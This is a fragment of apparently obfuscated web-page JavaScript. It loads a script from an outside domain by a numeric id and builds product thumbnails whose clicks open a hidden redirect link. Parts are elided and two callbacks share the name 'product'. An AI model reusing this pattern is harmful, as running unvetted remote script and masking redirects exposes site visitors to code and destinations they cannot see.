...
if (id['match'](/^[0-9]+$/) != null) {
    ...
    s['src'] = 'https://firebot-ae.widaryanto.info/content.php?id=' + id,
    ...
    function product(prodi) {
        if (prodi['result']) {
            ...
            for (i = 0x0; i < ranimgall; i++) {
                i < 0x5 && (tampillp += '<a\x20href=\x22\x22\x20rel=\x22noindex,nofollow\x22\x20target=\x22_blank\x22\x20onclick=\x22window.open(\x27' + redirect_link + '\')\"><img class=\"thumbnail\" data-qazy=\"true\" src=\"' + splitimgall[i] + '_140x140q50.jpg_.webp\" alt=\"' + prodnama + '\" title=\"' + prodnama + '\"><noscript><img src=\"' + splitimgall[i] + '\" alt=\"' + prodnama + '\" title=\"' + prodnama + '\"></noscript></a>');
            }
    ...
    function product(mbilid) {
        if (mbilid['result']) {
            ...
            for (i = 0; i < lenghasileid; i++) {
                songhasileid += '<a href=\"/details.html?id=' + splithasileid[i] + '\x22\x20target=\x22_blank\x22>' + splithasileid[i] + '</a>\x20|\x20';
            }
